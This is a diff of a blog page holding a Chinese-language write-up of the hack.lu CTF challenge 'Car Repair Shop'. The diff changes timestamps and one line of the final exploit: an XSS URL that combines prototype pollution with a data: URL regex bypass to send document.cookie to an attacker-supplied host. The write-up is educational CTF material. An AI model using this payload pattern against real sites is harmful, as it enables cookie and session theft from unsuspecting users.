@@ -72,7 +72,7 @@
 <meta property="og:image" content="https://lcark.github.io/images/pasted-5.png">
 <meta property="og:image" content="https://lcark.github.io/images/pasted-6.png">
 <meta property="og:image" content="https://lcark.github.io/images/pasted-7.png">
-<meta property="og:updated_time" content="2019-10-27T04:07:53.084Z">
+<meta property="og:updated_time" content="2019-10-27T09:57:18.491Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="hack.lu ctf-Car Repair Shop(xss, prototype pollution, bypass) ">
 <meta name="twitter:description" content="题目描述“Your Car broke down?! Come to our shop, we repair all cars! Even very old ones.” 传送门题目分析点开题目，右下角有个明显的链接get your cookie, 是一个提交链接的界面显然是dom-based xss以下是关键代码car.class.js">
@@ -288,7 +288,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2019-10-27 12:07:53" itemprop="dateModified" datetime="2019-10-27T12:07:53+08:00">2019-10-27</time>
+                <time title="Modified: 2019-10-27 17:57:18" itemprop="dateModified" datetime="2019-10-27T17:57:18+08:00">2019-10-27</time>
               </span>
             
           
@@ -354,7 +354,7 @@
 <p>这个正则表达式，这个我们用<code>data</code>协议绕过即可：<br><br><code>data:[&lt;mime type&gt;][;charset=&lt;charset&gt;][;base64],&lt;encoded data&gt;</code></p>
 <p><img src="/images/pasted-7.png" alt="upload successful"></p>
 <p>OK！以下是完整payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://car-repair-shop.fluxfingersforfuture.fluxfingers.net/?repair=&#123;&quot;key&quot;:&quot;🔑&quot;,&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:[&quot;lol&quot;]&#125;&#125;&amp;help=data://car-repair-shop.fluxfingersforfuture.fluxfingers.net/,$.get(&apos;[your-url]&apos;+document.cookie)//.js#Bugatti%20Porsche</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://car-repair-shop.fluxfingersforfuture.fluxfingers.net/?repair=&#123;&quot;key&quot;:&quot;🔑&quot;,&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:[&quot;lol&quot;]&#125;&#125;&amp;help=data://car-repair-shop.fluxfingersforfuture.fluxfingers.net/a/,$.get(&apos;[your-url]&apos;+document.cookie)//.js#Bugatti%20Porsche</span><br></pre></td></tr></table></figure>
 
 <h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><ol>
 <li>使用extend绕过key的检测</li>
